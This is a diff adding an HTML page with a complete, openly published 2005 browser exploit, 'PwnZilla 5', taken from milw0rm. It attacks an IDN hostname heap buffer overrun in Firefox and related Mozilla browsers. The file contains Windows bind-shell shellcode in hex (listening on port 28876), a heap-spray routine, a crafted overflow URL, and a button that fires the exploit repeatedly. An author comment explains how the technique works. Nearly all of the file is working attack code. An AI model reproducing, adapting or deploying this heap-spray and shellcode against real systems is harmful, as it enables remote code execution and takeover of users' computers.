@@ -1,0 +1,301 @@
+<HTML><SCRIPT>
+/*
+_______________________________________________________________________________
+                                                                               
+     SSSSSSS,  SSSSSSS' PwnZilla 5 - One sploit fits all. (FireFox optimized)  
+    iSY   iS;    .sS*   Exploit for IDN host name heap buffer overrun in       
+   .SSSSSSS*   .sS*     Mozilla browsers (FireFox, Mozilla and Netscape)       
+   iS;       .sS*       Copyright (C) 2003-2005 by Berend-Jan Wever.           
+  .SS       sSSSSSSP    <berendjanwever@gmail.com>                             
+_______________________________________________________________________________
+          Official release: http://www.milw0rm.com/id.php?id=1224              
+
+  This program is free software; you can redistribute it and/or modify it under
+  the terms of the GNU General Public License version 2, 1991 as published by
+  the Free Software Foundation.
+
+  This program is distributed in the hope that it will be useful, but WITHOUT
+  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
+  details.
+
+  A copy of the GNU General Public License can be found at:
+    http://www.gnu.org/licenses/gpl.html
+  or you can write to:
+    Free Software Foundation, Inc.
+    59 Temple Place - Suite 330
+    Boston, MA  02111-1307
+    USA.
+
+	One sploit to rule them all, One sploit to find them,
+	One sploit to bring them all and to port 28876 bind them.
+
+	Credits and thanks:
+	Tom Ferris/www.security-protocols.com - For finding the vulnerability.
+	Aviv Raff - Thanks for helping me advance the heap spray technology.
+	str0ke/www.milw0rm.com - Thanks for testing and hosting the exploit.
+	HDM/www.metasploit.com - Thanks for the basis of my shellcode.
+
+	Technical details:
+	Since Netscape has not replied to reports about this vulnerability I've
+	chosen to release it. Since there is no patch out yet, this version does
+	not target all affected browsers. It is optimized to work with FireFox, who
+	do have a patch out, but on a rare occasion it will work in Netscape.
+
+	This exploits a heap overrun. Rather then trying to beat the security of
+	modern heap managers, I ignore them and try to overwrite data in the
+	heap blocks after the block we overrun. It's a game of chance where we
+	hope the targetted browser will use this overwritten data in a call before
+	it throws an access violation. We have some control over the odds, more
+	on that later.
+
+	Exploitation is achieved by using the same old heap blocks trick that I've
+	published about a year ago in my Internet Exploiter exploits. It creates a
+	string that contains a nopslide and a shellcode. This string is (almost)
+	exactly large enough to fit into a large heap block. It makes copies
+	of the string to create more large heap blocks. These heap blocks will fill
+	all memory between roughly 0x02000000 and 0x28081976. The nopslide consists
+	of values that can be used as code and pointers; these pointers will all
+	point to addresses in this same region of memory.
+	The actually vulnerability is used when it creates a number of image
+	objects and set their "src" to a url that exploits it to overwrite random
+	parts of heap memory with a range of addresses that all point to the large
+	heap blocks.
+	While it continues to create more and more images, chances are that some
+	part of FireFox will use the overwritten parts of the heap in a "call" or
+	"jmp". This will cause our shellcode to get executed.
+
+	Previous exploits have all relied on one address being used in the nopslide
+	and in exploiting the vulnerability to overwrite EIP, that's why you see
+	0x0D0D0D0D in so many of my exploits and other exploits based on my code.
+	Because in previous exploits the vulnerable code would just read from this
+	address and/or call it, this worked pretty well.
+	This exploit is overwriting random parts of the heap and may therefore
+	overwrite a number of pointers that may be used in a write operation.
+	This causes a problem if some part of the code writes to one of our
+	addresses first and then another part calls it, thereby executing
+	whatever value the first part overwrote it with as assembly. This may
+	translate to instructions that cause exceptions, preventing the exploit
+	from working. To increase our chances of success, we supply it with a
+	variety of addresses, in an effort to make different parts of the
+	program use different addresses and hope we end up with executing a
+	"clean" nopslide.
+
+	For Netscape, addresses < 0x10000000 have proven to not work because it
+	has a tendency to add random blocks to the heap while we're spraying
+	(for no apparent reason). These somehow always end up exactly where we
+	don't want them.
+
+*/
+    var startDate = new Date();
+	var iFillToAddress = 0x28081976;
+    var iHeapBlockSize = 0x00200000;
+	var iHeapHeaderSize = 0x40; // This should work for all browsers/OS-es.
+    var iHeapStartAddress = 0x00420000;
+    // The %uXXXX encoding proved hard for a lot of people... damn n00bs!
+	var sShellcodeBytes = // Make sure the number of bytes is EVEN!
+		"90 90 90 90 eb 43 56 57 8b 45 3c 8b 54 05 78 01 ea 52 8b 52 20 01 " +
+		"ea 31 c0 31 c9 41 8b 34 8a 01 ee 31 ff c1 cf 13 ac 01 c7 85 c0 75 " +
+		"f6 39 df 75 ea 5a 8b 5a 24 01 eb 66 8b 0c 4b 8b 5a 1c 01 eb 8b 04 " +
+		"8b 01 e8 5f 5e ff e0 fc 31 c0 64 8b 40 30 8b 40 0c 8b 70 1c ad 8b " +
+		"68 08 31 c0 66 b8 6c 6c 50 68 33 32 2e 64 68 77 73 32 5f 54 bb 71 " +
+		"a7 e8 fe e8 90 ff ff ff 89 ef 89 c5 81 c4 70 fe ff ff 54 31 c0 fe " +
+		"c4 40 50 bb 22 7d ab 7d e8 75 ff ff ff 31 c0 50 50 50 50 40 50 40 " +
+		"50 bb a6 55 34 79 e8 61 ff ff ff 89 c6 31 c0 50 50 35 02 01 70 cc " +
+		"fe cc 50 89 e0 50 6a 10 50 56 bb 81 b4 2c be e8 42 ff ff ff 31 c0 " +
+		"50 56 bb d3 fa 58 9b e8 34 ff ff ff 58 60 6a 10 54 50 56 bb 47 f3 " +
+		"56 c6 e8 23 ff ff ff 89 c6 31 db 53 68 2e 63 6d 64 89 e1 41 31 db " +
+		"56 56 56 53 53 31 c0 fe c4 40 50 53 53 53 53 53 53 53 53 53 53 6a " +
+		"44 89 e0 53 53 53 53 54 50 53 53 53 43 53 4b 53 53 51 53 87 fd bb " +
+		"21 d0 05 d0 e8 df fe ff ff 5b 31 c0 48 50 53 bb 43 cb 8d 5f e8 cf " +
+		"fe ff ff 56 87 ef bb 12 6b 6d d0 e8 c2 fe ff ff 83 c4 5c 61 eb 89 ";
+	var sShellcode = unescape(
+		sShellcodeBytes.replace(
+			// ...I now use regular expressions (thanks, Secunia! :P)
+			/\s*([0-9A-Fa-f][0-9A-Fa-f])\s*([0-9A-Fa-f][0-9A-Fa-f])/g,
+			"%u$2$1"
+		)
+	);
+
+	// Experimenting with a debugger has let to this string, which uses the max
+	// hostname length FireFox allows (63 bytes) to create the largest
+	// overwrite possible. Each of the 0xAD-s gets expanded into two bytes, 
+	// which in theory would allow for a 126 bytes overwrite. But in practise
+	// FireFox will use 32 of these bytes for other things like the "http://",
+	// '/', '\0' and some other stuff. This leaves us with 94 bytes and a \0 to
+	// overwrite heap memory with.
+	var sURL = unescape(
+		"http://" +
+		"%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD" +
+		"%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD" +
+		"%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD%AD" +
+		"/" +
+		// Characters under 0x21 cannot be used, neither can 0x22. This
+		// is what we overwrite the heap with, so everything needs to be a
+		// pointer to one of our nopslides.
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23%24%24" +
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23%24%24" +
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23%24%24" +
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23%24%24" +
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23%24%24" +
+		"%21%21%25%21%23%21%24%25%25%23%25%24%23%23"
+	);
+    // Create one nopslide -------------------------------------------------
+    var sNopslide = "";
+    var iNopslideSize = iHeapBlockSize - iHeapHeaderSize 
+   					  - sShellcode.length * 2 - 2; // NULL terminator adds 2
+    var sAllWorkAndNoPlayMakesJackADullBoy = unescape(
+    	// A list of addresses we hope our browser will use in a call or jmp.
+    	// They should all point to a nopslide, preferably all to a different
+    	// one _and_ be valid "nop" instructions too.
+		"%u1414%u1415%u141C%u141D%u1514%u1515%u151C%u151D" +
+		"%u1C14%u1C15%u1C1C%u1C1D%u1D14%u1D15%u1D1C%u1D1D"
+	);
+    // (Make sure that ^^^ has a length that is a power of 2 (2, 4, 8 ,16, ...)
+    // The code below isn't sophisticated enough to handled other lengths.
+    for (var bit = Math.pow(2, 31); bit > 1; bit /= 2) {
+        sNopslide += sNopslide + (
+        	iNopslideSize & (bit*sAllWorkAndNoPlayMakesJackADullBoy.length) ?
+        	sAllWorkAndNoPlayMakesJackADullBoy : ""
+        );
+    }
+    // We've only made complete copies of the string, we may need a part of it
+    // to make it exactly the size we want it to be:
+    sNopslide = sNopslide + sAllWorkAndNoPlayMakesJackADullBoy.substr(0,
+    	iNopslideSize/2 - sNopslide.length
+    );
+    // How many blocks do we need to fill memory up to iHeap_fill_to_address?
+    var iHeapBlockCount = Math.ceil(
+    	(iFillToAddress - iHeapStartAddress) / iHeapBlockSize
+    );
+
+    // Show copyright message and some stats ----------------------------------
+    document.write(
+    	"<H2>Pwnzilla</H2>" +
+    	"<B>Copyright (C) 2003-2005 Berend-Jan \"SkyLined\" Wever.</B><BR>" +
+		"This program is released under the GNU Public License version 2, " +
+		"1991 and comes with ABSOLUTELY NO WARRANTY. View source for " +
+		"details.<HR>" +
+    	"<H2>Multi threaded heap spray 2005</H2>" +
+		"Assumed heap header size: " + number(iHeapHeaderSize) + " bytes.<BR>"+
+    	"Nopslide size: " + number(sNopslide.length*2) + " bytes.<BR>" +
+		"Shellcode size: " + number(sShellcode.length*2) + " bytes.<BR>" +
+    	"Heap blocks size: " + number(iHeapBlockSize) + " bytes.<BR>" +
+		"<SPAN id=\"heapBlockStatus\">" +
+        	"Allocating " +  number(iHeapBlockCount) + " heap blocks...<BR>" +
+			"<DIV style=\"border:1px solid black; background:#808080; " +
+			"width:500px;\"><DIV style=\"text-align:right; " +
+			"border-right:1px solid black; background:#00FF00;\" " +
+			"id=\"progressBar\">0</DIV></DIV>" +
+		"</SPAN>" +
+		"<SPAN id=\"exploitStatus\"></SPAN>"
+	);
+    var heapBlockStatusElement = document.getElementById("heapBlockStatus");
+	var progressBarElement = document.getElementById("progressBar");
+	var exploitStatusElement = document.getElementById("exploitStatus");
+
+    var asHeapBlocks = new Array();
+
+	// The next part uses timeouts to run in the background.
+    createHeapBlock();
+    function createHeapBlock() {
+    	if (asHeapBlocks.length < iHeapBlockCount) {
+		    // Create a heap block --------------------------------------------
+	        asHeapBlocks.push(sNopslide + '' + sShellcode);
+	        var percentageDone = Math.round(
+	        	100*asHeapBlocks.length/iHeapBlockCount
+	        );
+			progressBarElement.innerHTML = 
+				"<NOBR>" +
+					bytes(asHeapBlocks.length*asHeapBlocks[0].length*2) +
+				"</NOBR>";
+			progressBarElement.style.width = percentageDone + "%";
+			setTimeout(arguments.callee, 10);
+		} else {
+		    // Done creating heap blocks --------------------------------------
+		    // Show stats
+	        heapBlockStatusElement.innerHTML = 
+		    	"Heap blocks count: " + asHeapBlocks.length + ".<BR>" +
+		    	"Total heap consumption: " + 
+		    		bytes(asHeapBlocks.length*asHeapBlocks[0].length*2) +
+		    		".<BR>" +
+				"Elapsed time: " + 
+					time(new Date() - startDate) + ".<HR>" +
+		    	"<H2>Exploit</H2>" +
+		    	"Attack URL (size: " +
+		    		number(sURL.length*2) + " bytes):<BR>" +
+		    	"&quot;" + escape(sURL) + "&quot;<BR><BR>";
+		    //  Ask if you want to get pwned
+		    exploitStatusElement.innerHTML =
+				"<BUTTON onclick=\"FiredFox();\">" +
+					"Click here if you want to run the actual exploit" +
+				"</BUTTON>";
+		}
+	} // createHeapBlock()
+	function FiredFox() {
+		exploitStatusElement.innerHTML =
+			"Running exploit code...<BR>" +
+			"(It may take some time before the exploit works. You should " +
+			"see a progress bar below. If it stops, it either worked and a " +
+			"shell is waiting for you at port 28876 or your browser has " +
+			"gone into an infinite loop).<BR>";
+		setInterval(function() {
+			var oElement = new Image();
+			oElement.src = sURL+""; // This is where we abuse the flaw.
+			oElement.border = 1;
+			oElement.width = 1;
+			oElement.height = 10;
+			document.body.appendChild(oElement);
+		}, 1);		
+	} // FiredFox()
+
+	function number(iValue) {
+		// Returns a "pretty" string representation of a number:
+		//		number(1000000.5) == "1,000,000.5"
+		var sResult = "" + iValue;
+		
+		for (var sResult = ""; iValue > 0; iValue = Math.floor(iValue/1000)) {
+			sResult = (iValue % 1000) +
+				(sResult.length > 0 ? "," + sResult : "");
+			if (iValue > 1000 && sResult.length % 4 < 3)
+				sResult = "0" + sResult;
+		}
+		return sResult;
+	} // number()
+
+	function bytes(iValue) {
+		// Returns a "pretty" string representation of a number of bytes:
+		//		bytes(1000000.5) == "976.57 KB"
+		var aUnits = new Array(
+    		"Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"
+	    );
+	    for (var i = 0; iValue > 1024; i++, iValue /= 1024) {}
+	    sResult =  number(Math.ceil(iValue * 100) / 100) + // Two decimals
+	    	" " + aUnits[i]
+		return sResult;
+	}// bytes()
+	function time(iValue) {
+		// Returns a "pretty" string representation of an elapsed number of
+		// milliseconds:	
+		//		time(1000000.5) == "16m 40s 1µs"
+		var aUnits = new Array(
+			new Array(1000,	unescape("%u03BCs")),
+			new Array(60,	"s"),
+			new Array(60,	"m"),
+			new Array(24,	"h"),
+			new Array(7,	"d"),
+			new Array(52,	"y")
+		);
+		sResult = "";
+		
+		for(var i=0; iValue > 0 && i<aUnits.length; i++) {
+			var iSize = aUnits[i][0], sUnit = aUnits[i][1];
+			sResult = Math.round(iValue % iSize) + sUnit +
+				(i>0 ? " " : "") + sResult;
+    		iValue = Math.floor(iValue / iSize);
+    	}
+    	return sResult;
+	} // time()
+</SCRIPT></HTML>
+
+# milw0rm.com [2005-09-22]
